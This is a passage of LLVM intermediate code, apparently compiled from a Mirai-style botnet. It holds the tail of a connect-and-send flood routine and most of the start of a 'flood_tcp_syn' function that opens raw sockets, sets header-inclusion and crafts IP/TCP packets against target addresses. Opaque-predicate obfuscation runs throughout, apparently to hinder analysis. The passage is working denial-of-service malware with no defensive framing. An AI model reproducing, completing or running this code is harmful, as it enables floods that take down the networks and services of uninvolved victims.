  %162 = getelementptr inbounds %struct.target, %struct.target* %159, i64 %161
  %163 = getelementptr inbounds %struct.target, %struct.target* %162, i32 0, i32 1
  %164 = load i16, i16* %163, align 4
  %165 = zext i16 %164 to i32
  %166 = lshr i32 %156, %165
  %167 = add i32 %155, %166
  %168 = call i32 @htonl(i32 %167) #9
  br label %178

; <label>:169:                                    ; preds = %115
  %170 = load %struct.arguments*, %struct.arguments** %2, align 8
  %171 = getelementptr inbounds %struct.arguments, %struct.arguments* %170, i32 0, i32 0
  %172 = load %struct.target*, %struct.target** %171, align 8
  %173 = load i32, i32* %5, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.target, %struct.target* %172, i64 %174
  %176 = getelementptr inbounds %struct.target, %struct.target* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 4
  br label %178

; <label>:178:                                    ; preds = %169, %146
  %179 = phi i32 [ %168, %146 ], [ %177, %169 ]
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %181 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %180, i32 0, i32 0
  store i32 %179, i32* %181, align 4
  %182 = load i32*, i32** %7, align 8
  %183 = load i32, i32* %5, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds i32, i32* %182, i64 %184
  %186 = load i32, i32* %185, align 4
  %187 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %188 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %188, %struct.sockaddr** %187, align 8
  %189 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %190 = load %struct.sockaddr*, %struct.sockaddr** %189, align 8
  %191 = call i32 @connect(i32 %186, %struct.sockaddr* %190, i32 16)
  %192 = load i8**, i8*** %6, align 8
  %193 = load i32, i32* %5, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i8*, i8** %192, i64 %194
  %196 = load i8*, i8** %195, align 8
  %197 = load i16, i16* %3, align 2
  %198 = zext i16 %197 to i32
  call void @rand_string(i8* %196, i32 %198)
  br label %199

; <label>:199:                                    ; preds = %178
  %200 = load i32, i32* @x.17
  %201 = load i32, i32* @y.18
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %199
  %208 = load i32, i32* %5, align 4
  %209 = add nsw i32 %208, 1
  store i32 %209, i32* %5, align 4
  %210 = load i32, i32* @x.17
  %211 = load i32, i32* @y.18
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart225, label %originalBB11alteredBB

originalBBpart225:                                ; preds = %originalBB11
  br label %46

; <label>:218:                                    ; preds = %46
  %219 = load i32, i32* @x.17
  %220 = load i32, i32* @y.18
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %218
  %227 = load i32, i32* @x.17
  %228 = load i32, i32* @y.18
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %235

; <label>:235:                                    ; preds = %292, %originalBBpart229
  store i32 0, i32* %5, align 4
  br label %236

; <label>:236:                                    ; preds = %originalBBpart239, %235
  %237 = load i32, i32* @x.17
  %238 = load i32, i32* @y.18
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %236
  %245 = load i32, i32* %5, align 4
  %246 = load %struct.arguments*, %struct.arguments** %2, align 8
  %247 = getelementptr inbounds %struct.arguments, %struct.arguments* %246, i32 0, i32 3
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp slt i32 %245, %249
  %251 = load i32, i32* @x.17
  %252 = load i32, i32* @y.18
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %250, label %259, label %292

; <label>:259:                                    ; preds = %originalBBpart233
  %260 = load i32*, i32** %7, align 8
  %261 = load i32, i32* %5, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds i32, i32* %260, i64 %262
  %264 = load i32, i32* %263, align 4
  %265 = load i8**, i8*** %6, align 8
  %266 = load i32, i32* %5, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds i8*, i8** %265, i64 %267
  %269 = load i8*, i8** %268, align 8
  %270 = load i16, i16* %3, align 2
  %271 = zext i16 %270 to i64
  %272 = call i64 @send(i32 %264, i8* %269, i64 %271, i32 16384)
  br label %273

; <label>:273:                                    ; preds = %259
  %274 = load i32, i32* @x.17
  %275 = load i32, i32* @y.18
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %273
  %282 = load i32, i32* %5, align 4
  %283 = add nsw i32 %282, 1
  store i32 %283, i32* %5, align 4
  %284 = load i32, i32* @x.17
  %285 = load i32, i32* @y.18
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart239, label %originalBB35alteredBB

originalBBpart239:                                ; preds = %originalBB35
  br label %236

; <label>:292:                                    ; preds = %originalBBpart233
  br label %235
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %66
  %294 = load i16, i16* %3, align 2
  %295 = zext i16 %294 to i32
  %_ = sub i32 0, %295
  %gen = add i32 %_, 1
  %_1 = sub i32 %295, 1
  %gen2 = mul i32 %_1, 1
  %_3 = sub i32 %295, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 %295, 1
  %gen6 = mul i32 %_5, 1
  %296 = add nsw i32 %295, 1
  %297 = sext i32 %296 to i64
  %298 = call noalias i8* @malloc(i64 %297) #8
  %299 = load i8**, i8*** %6, align 8
  %300 = load i32, i32* %5, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds i8*, i8** %299, i64 %301
  store i8* %298, i8** %302, align 8
  %303 = load i8**, i8*** %6, align 8
  %304 = load i32, i32* %5, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds i8*, i8** %303, i64 %305
  %307 = load i8*, i8** %306, align 8
  %308 = icmp ne i8* %307, null
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %98
  call void @exit(i32 1) #10
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %199
  %309 = load i32, i32* %5, align 4
  %_12 = sub i32 %309, 1
  %gen13 = mul i32 %_12, 1
  %_14 = sub i32 0, %309
  %gen15 = add i32 %_14, 1
  %_16 = sub i32 %309, 1
  %gen17 = mul i32 %_16, 1
  %_18 = sub i32 0, %309
  %gen19 = add i32 %_18, 1
  %_20 = sub i32 %309, 1
  %gen21 = mul i32 %_20, 1
  %_22 = shl i32 %309, 1
  %_23 = shl i32 %309, 1
  %310 = add nsw i32 %309, 1
  store i32 %310, i32* %5, align 4
  br label %originalBB11

originalBB27alteredBB:                            ; preds = %originalBB27, %218
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %236
  %311 = load i32, i32* %5, align 4
  %312 = load %struct.arguments*, %struct.arguments** %2, align 8
  %313 = getelementptr inbounds %struct.arguments, %struct.arguments* %312, i32 0, i32 3
  %314 = load i8, i8* %313, align 1
  %315 = zext i8 %314 to i32
  %316 = icmp slt i32 %311, %315
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %273
  %317 = load i32, i32* %5, align 4
  %_36 = shl i32 %317, 1
  %_37 = shl i32 %317, 1
  %318 = add nsw i32 %317, 1
  store i32 %318, i32* %5, align 4
  br label %originalBB35
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #3

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #3

declare i32 @connect(i32, %struct.sockaddr*, i32) #6

declare i64 @send(i32, i8*, i64, i32) #6

; Function Attrs: noinline nounwind uwtable
define void @flood_tcp_syn(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca i16, align 2
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i8**, align 8
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.tcphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca %struct.sockaddr_in, align 4
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i16 0, i16* %5, align 2
  store i16 0, i16* %6, align 2
  store i8 0, i8* %7, align 1
  store i16 0, i16* %8, align 2
  store i8 0, i8* %10, align 1
  store i8 0, i8* %11, align 1
  store i8 0, i8* %12, align 1
  store i8 0, i8* %13, align 1
  store i8 0, i8* %14, align 1
  store i8 0, i8* %15, align 1
  store i8 0, i8* %16, align 1
  store i16 0, i16* %17, align 2
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  store i32 0, i32* %23, align 4
  %31 = load %struct.arguments*, %struct.arguments** %2, align 8
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %31, i32 0, i32 1
  %33 = load %struct.option*, %struct.option** %32, align 8
  %34 = load %struct.arguments*, %struct.arguments** %2, align 8
  %35 = getelementptr inbounds %struct.arguments, %struct.arguments* %34, i32 0, i32 2
  %36 = load i8, i8* %35, align 8
  %37 = call zeroext i16 @retrieve_opt_num(%struct.option* %33, i8 zeroext %36, i8 zeroext 2, i16 zeroext 900)
  store i16 %37, i16* %5, align 2
  %38 = load %struct.arguments*, %struct.arguments** %2, align 8
  %39 = getelementptr inbounds %struct.arguments, %struct.arguments* %38, i32 0, i32 1
  %40 = load %struct.option*, %struct.option** %39, align 8
  %41 = load %struct.arguments*, %struct.arguments** %2, align 8
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %41, i32 0, i32 2
  %43 = load i8, i8* %42, align 8
  %44 = call zeroext i16 @retrieve_opt_num(%struct.option* %40, i8 zeroext %43, i8 zeroext 1, i16 zeroext -1)
  store i16 %44, i16* %6, align 2
  %45 = load %struct.arguments*, %struct.arguments** %2, align 8
  %46 = getelementptr inbounds %struct.arguments, %struct.arguments* %45, i32 0, i32 1
  %47 = load %struct.option*, %struct.option** %46, align 8
  %48 = load %struct.arguments*, %struct.arguments** %2, align 8
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %48, i32 0, i32 2
  %50 = load i8, i8* %49, align 8
  %51 = call zeroext i16 @retrieve_opt_num(%struct.option* %47, i8 zeroext %50, i8 zeroext 7, i16 zeroext 255)
  %52 = trunc i16 %51 to i8
  store i8 %52, i8* %7, align 1
  %53 = load %struct.arguments*, %struct.arguments** %2, align 8
  %54 = getelementptr inbounds %struct.arguments, %struct.arguments* %53, i32 0, i32 1
  %55 = load %struct.option*, %struct.option** %54, align 8
  %56 = load %struct.arguments*, %struct.arguments** %2, align 8
  %57 = getelementptr inbounds %struct.arguments, %struct.arguments* %56, i32 0, i32 2
  %58 = load i8, i8* %57, align 8
  %59 = call zeroext i16 @retrieve_opt_num(%struct.option* %55, i8 zeroext %58, i8 zeroext 8, i16 zeroext -1)
  store i16 %59, i16* %8, align 2
  %60 = load %struct.arguments*, %struct.arguments** %2, align 8
  %61 = getelementptr inbounds %struct.arguments, %struct.arguments* %60, i32 0, i32 1
  %62 = load %struct.option*, %struct.option** %61, align 8
  %63 = load %struct.arguments*, %struct.arguments** %2, align 8
  %64 = getelementptr inbounds %struct.arguments, %struct.arguments* %63, i32 0, i32 2
  %65 = load i8, i8* %64, align 8
  %66 = call zeroext i16 @retrieve_opt_num(%struct.option* %62, i8 zeroext %65, i8 zeroext 9, i16 zeroext 0)
  %67 = trunc i16 %66 to i8
  store i8 %67, i8* %10, align 1
  %68 = load %struct.arguments*, %struct.arguments** %2, align 8
  %69 = getelementptr inbounds %struct.arguments, %struct.arguments* %68, i32 0, i32 1
  %70 = load %struct.option*, %struct.option** %69, align 8
  %71 = load %struct.arguments*, %struct.arguments** %2, align 8
  %72 = getelementptr inbounds %struct.arguments, %struct.arguments* %71, i32 0, i32 2
  %73 = load i8, i8* %72, align 8
  %74 = call zeroext i16 @retrieve_opt_num(%struct.option* %70, i8 zeroext %73, i8 zeroext 10, i16 zeroext 0)
  %75 = trunc i16 %74 to i8
  store i8 %75, i8* %11, align 1
  %76 = load %struct.arguments*, %struct.arguments** %2, align 8
  %77 = getelementptr inbounds %struct.arguments, %struct.arguments* %76, i32 0, i32 1
  %78 = load %struct.option*, %struct.option** %77, align 8
  %79 = load %struct.arguments*, %struct.arguments** %2, align 8
  %80 = getelementptr inbounds %struct.arguments, %struct.arguments* %79, i32 0, i32 2
  %81 = load i8, i8* %80, align 8
  %82 = call zeroext i16 @retrieve_opt_num(%struct.option* %78, i8 zeroext %81, i8 zeroext 11, i16 zeroext 0)
  %83 = trunc i16 %82 to i8
  store i8 %83, i8* %12, align 1
  %84 = load %struct.arguments*, %struct.arguments** %2, align 8
  %85 = getelementptr inbounds %struct.arguments, %struct.arguments* %84, i32 0, i32 1
  %86 = load %struct.option*, %struct.option** %85, align 8
  %87 = load %struct.arguments*, %struct.arguments** %2, align 8
  %88 = getelementptr inbounds %struct.arguments, %struct.arguments* %87, i32 0, i32 2
  %89 = load i8, i8* %88, align 8
  %90 = call zeroext i16 @retrieve_opt_num(%struct.option* %86, i8 zeroext %89, i8 zeroext 12, i16 zeroext 0)
  %91 = trunc i16 %90 to i8
  store i8 %91, i8* %13, align 1
  %92 = load %struct.arguments*, %struct.arguments** %2, align 8
  %93 = getelementptr inbounds %struct.arguments, %struct.arguments* %92, i32 0, i32 1
  %94 = load %struct.option*, %struct.option** %93, align 8
  %95 = load %struct.arguments*, %struct.arguments** %2, align 8
  %96 = getelementptr inbounds %struct.arguments, %struct.arguments* %95, i32 0, i32 2
  %97 = load i8, i8* %96, align 8
  %98 = call zeroext i16 @retrieve_opt_num(%struct.option* %94, i8 zeroext %97, i8 zeroext 13, i16 zeroext 0)
  %99 = trunc i16 %98 to i8
  store i8 %99, i8* %14, align 1
  %100 = load %struct.arguments*, %struct.arguments** %2, align 8
  %101 = getelementptr inbounds %struct.arguments, %struct.arguments* %100, i32 0, i32 1
  %102 = load %struct.option*, %struct.option** %101, align 8
  %103 = load %struct.arguments*, %struct.arguments** %2, align 8
  %104 = getelementptr inbounds %struct.arguments, %struct.arguments* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 8
  %106 = call zeroext i16 @retrieve_opt_num(%struct.option* %102, i8 zeroext %105, i8 zeroext 14, i16 zeroext 1)
  %107 = trunc i16 %106 to i8
  store i8 %107, i8* %15, align 1
  %108 = load %struct.arguments*, %struct.arguments** %2, align 8
  %109 = getelementptr inbounds %struct.arguments, %struct.arguments* %108, i32 0, i32 1
  %110 = load %struct.option*, %struct.option** %109, align 8
  %111 = load %struct.arguments*, %struct.arguments** %2, align 8
  %112 = getelementptr inbounds %struct.arguments, %struct.arguments* %111, i32 0, i32 2
  %113 = load i8, i8* %112, align 8
  %114 = call zeroext i16 @retrieve_opt_num(%struct.option* %110, i8 zeroext %113, i8 zeroext 15, i16 zeroext 0)
  %115 = trunc i16 %114 to i8
  store i8 %115, i8* %16, align 1
  %116 = load %struct.arguments*, %struct.arguments** %2, align 8
  %117 = getelementptr inbounds %struct.arguments, %struct.arguments* %116, i32 0, i32 1
  %118 = load %struct.option*, %struct.option** %117, align 8
  %119 = load %struct.arguments*, %struct.arguments** %2, align 8
  %120 = getelementptr inbounds %struct.arguments, %struct.arguments* %119, i32 0, i32 2
  %121 = load i8, i8* %120, align 8
  %122 = call zeroext i16 @retrieve_opt_num(%struct.option* %118, i8 zeroext %121, i8 zeroext 16, i16 zeroext -1)
  store i16 %122, i16* %17, align 2
  %123 = load %struct.arguments*, %struct.arguments** %2, align 8
  %124 = getelementptr inbounds %struct.arguments, %struct.arguments* %123, i32 0, i32 1
  %125 = load %struct.option*, %struct.option** %124, align 8
  %126 = load %struct.arguments*, %struct.arguments** %2, align 8
  %127 = getelementptr inbounds %struct.arguments, %struct.arguments* %126, i32 0, i32 2
  %128 = load i8, i8* %127, align 8
  %129 = call zeroext i16 @retrieve_opt_num(%struct.option* %125, i8 zeroext %128, i8 zeroext 17, i16 zeroext -1)
  %130 = zext i16 %129 to i32
  store i32 %130, i32* %18, align 4
  %131 = load %struct.arguments*, %struct.arguments** %2, align 8
  %132 = getelementptr inbounds %struct.arguments, %struct.arguments* %131, i32 0, i32 1
  %133 = load %struct.option*, %struct.option** %132, align 8
  %134 = load %struct.arguments*, %struct.arguments** %2, align 8
  %135 = getelementptr inbounds %struct.arguments, %struct.arguments* %134, i32 0, i32 2
  %136 = load i8, i8* %135, align 8
  %137 = load i32, i32* @LOCAL_ADDRESS, align 4
  %138 = call i32 @retrieve_opt_ipv4(%struct.option* %133, i8 zeroext %136, i8 zeroext 18, i32 %137)
  store i32 %138, i32* %19, align 4
  %139 = load %struct.arguments*, %struct.arguments** %2, align 8
  %140 = getelementptr inbounds %struct.arguments, %struct.arguments* %139, i32 0, i32 1
  %141 = load %struct.option*, %struct.option** %140, align 8
  %142 = load %struct.arguments*, %struct.arguments** %2, align 8
  %143 = getelementptr inbounds %struct.arguments, %struct.arguments* %142, i32 0, i32 2
  %144 = load i8, i8* %143, align 8
  %145 = call zeroext i16 @retrieve_opt_num(%struct.option* %141, i8 zeroext %144, i8 zeroext 19, i16 zeroext -1)
  %146 = zext i16 %145 to i32
  store i32 %146, i32* %20, align 4
  %147 = load %struct.arguments*, %struct.arguments** %2, align 8
  %148 = getelementptr inbounds %struct.arguments, %struct.arguments* %147, i32 0, i32 1
  %149 = load %struct.option*, %struct.option** %148, align 8
  %150 = load %struct.arguments*, %struct.arguments** %2, align 8
  %151 = getelementptr inbounds %struct.arguments, %struct.arguments* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 8
  %153 = call i8* @retrieve_opt_str(%struct.option* %149, i8 zeroext %152, i8 zeroext 6, i8* null)
  store i8* %153, i8** %21, align 8
  %154 = load %struct.arguments*, %struct.arguments** %2, align 8
  %155 = getelementptr inbounds %struct.arguments, %struct.arguments* %154, i32 0, i32 1
  %156 = load %struct.option*, %struct.option** %155, align 8
  %157 = load %struct.arguments*, %struct.arguments** %2, align 8
  %158 = getelementptr inbounds %struct.arguments, %struct.arguments* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 8
  %160 = call i8* @retrieve_opt_str(%struct.option* %156, i8 zeroext %159, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %161 = ptrtoint i8* %160 to i32
  store i32 %161, i32* %23, align 4
  %162 = load %struct.arguments*, %struct.arguments** %2, align 8
  %163 = getelementptr inbounds %struct.arguments, %struct.arguments* %162, i32 0, i32 3
  %164 = load i8, i8* %163, align 1
  %165 = zext i8 %164 to i64
  %166 = call noalias i8* @calloc(i64 %165, i64 8) #8
  %167 = bitcast i8* %166 to i8**
  store i8** %167, i8*** %9, align 8
  %168 = load i8**, i8*** %9, align 8
  %169 = icmp ne i8** %168, null
  br i1 %169, label %171, label %170

; <label>:170:                                    ; preds = %1
  call void @exit(i32 1) #10
  unreachable

; <label>:171:                                    ; preds = %1
  %172 = load i32, i32* @x.19
  %173 = load i32, i32* @y.20
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %171
  %180 = load %struct.arguments*, %struct.arguments** %2, align 8
  %181 = getelementptr inbounds %struct.arguments, %struct.arguments* %180, i32 0, i32 3
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i64
  %184 = call noalias i8* @calloc(i64 %183, i64 4) #8
  %185 = bitcast i8* %184 to i32*
  store i32* %185, i32** %22, align 8
  %186 = load i32*, i32** %22, align 8
  %187 = icmp ne i32* %186, null
  %188 = load i32, i32* @x.19
  %189 = load i32, i32* @y.20
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %187, label %197, label %196

; <label>:196:                                    ; preds = %originalBBpart2
  call void @exit(i32 1) #10
  unreachable

; <label>:197:                                    ; preds = %originalBBpart2
  store i32 0, i32* %3, align 4
  br label %198

; <label>:198:                                    ; preds = %489, %197
  %199 = load i32, i32* %3, align 4
  %200 = load %struct.arguments*, %struct.arguments** %2, align 8
  %201 = getelementptr inbounds %struct.arguments, %struct.arguments* %200, i32 0, i32 3
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp slt i32 %199, %203
  br i1 %204, label %205, label %492

; <label>:205:                                    ; preds = %198
  %206 = load i32, i32* @x.19
  %207 = load i32, i32* @y.20
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %205
  %214 = call i32 @socket(i32 2, i32 3, i32 6) #8
  %215 = load i32*, i32** %22, align 8
  %216 = load i32, i32* %3, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds i32, i32* %215, i64 %217
  store i32 %214, i32* %218, align 4
  %219 = load i32*, i32** %22, align 8
  %220 = load i32, i32* %3, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds i32, i32* %219, i64 %221
  %223 = load i32, i32* %222, align 4
  %224 = icmp eq i32 %223, -1
  %225 = load i32, i32* @x.19
  %226 = load i32, i32* @y.20
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %224, label %233, label %236

; <label>:233:                                    ; preds = %originalBBpart24
  %234 = load i8**, i8*** %9, align 8
  %235 = bitcast i8** %234 to i8*
  call void @free(i8* %235) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:236:                                    ; preds = %originalBBpart24
  store i32 1, i32* %4, align 4
  %237 = load i32*, i32** %22, align 8
  %238 = load i32, i32* %3, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds i32, i32* %237, i64 %239
  %241 = load i32, i32* %240, align 4
  %242 = bitcast i32* %4 to i8*
  %243 = call i32 @setsockopt(i32 %241, i32 0, i32 3, i8* %242, i32 4) #8
  %244 = icmp eq i32 %243, -1
  br i1 %244, label %245, label %248

; <label>:245:                                    ; preds = %236
  %246 = load i8**, i8*** %9, align 8
  %247 = bitcast i8** %246 to i8*
  call void @free(i8* %247) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:248:                                    ; preds = %236
  %249 = load i32, i32* %23, align 4
  %250 = icmp ne i32 %249, 0
  br i1 %250, label %251, label %270

; <label>:251:                                    ; preds = %248
  %252 = load i16, i16* %6, align 2
  %253 = load i32*, i32** %22, align 8
  %254 = load i32, i32* %3, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i32, i32* %253, i64 %255
  %257 = load i32, i32* %256, align 4
  %258 = load %struct.arguments*, %struct.arguments** %2, align 8
  %259 = getelementptr inbounds %struct.arguments, %struct.arguments* %258, i32 0, i32 0
  %260 = load %struct.target*, %struct.target** %259, align 8
  %261 = load i32, i32* %3, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.target, %struct.target* %260, i64 %262
  %264 = getelementptr inbounds %struct.target, %struct.target* %263, i32 0, i32 0
  %265 = load i32, i32* %264, align 4
  %266 = load i32, i32* %19, align 4
  %267 = load i16, i16* %8, align 2
  %268 = zext i16 %267 to i32
  %269 = call i32 @tcp_handshake(i16 zeroext %252, i32 %257, i32 %265, i32 %266, i32 %268)
  br label %270

; <label>:270:                                    ; preds = %251, %248
  %271 = load i16, i16* %5, align 2
  %272 = zext i16 %271 to i32
  %273 = add nsw i32 %272, 110
  %274 = sext i32 %273 to i64
  %275 = call noalias i8* @malloc(i64 %274) #8
  %276 = load i8**, i8*** %9, align 8
  %277 = load i32, i32* %3, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds i8*, i8** %276, i64 %278
  store i8* %275, i8** %279, align 8
  %280 = load i8**, i8*** %9, align 8
  %281 = load i32, i32* %3, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds i8*, i8** %280, i64 %282
  %284 = load i8*, i8** %283, align 8
  %285 = icmp ne i8* %284, null
  br i1 %285, label %305, label %286

; <label>:286:                                    ; preds = %270
  %287 = load i32, i32* @x.19
  %288 = load i32, i32* @y.20
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %286
  %295 = load i8**, i8*** %9, align 8
  %296 = bitcast i8** %295 to i8*
  call void @free(i8* %296) #8
  call void @exit(i32 1) #10
  %297 = load i32, i32* @x.19
  %298 = load i32, i32* @y.20
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  unreachable

; <label>:305:                                    ; preds = %270
  %306 = load i32, i32* @x.19
  %307 = load i32, i32* @y.20
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %305
  %314 = load i8**, i8*** %9, align 8
  %315 = load i32, i32* %3, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds i8*, i8** %314, i64 %316
  %318 = load i8*, i8** %317, align 8
  %319 = bitcast i8* %318 to %struct.iphdr*
  store %struct.iphdr* %319, %struct.iphdr** %24, align 8
  %320 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i64 1
  %322 = bitcast %struct.iphdr* %321 to %struct.tcphdr*
  store %struct.tcphdr* %322, %struct.tcphdr** %25, align 8
  %323 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %324 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %323, i64 1
  %325 = bitcast %struct.tcphdr* %324 to i8*
  store i8* %325, i8** %26, align 8
  %326 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %327 = bitcast %struct.iphdr* %326 to i8*
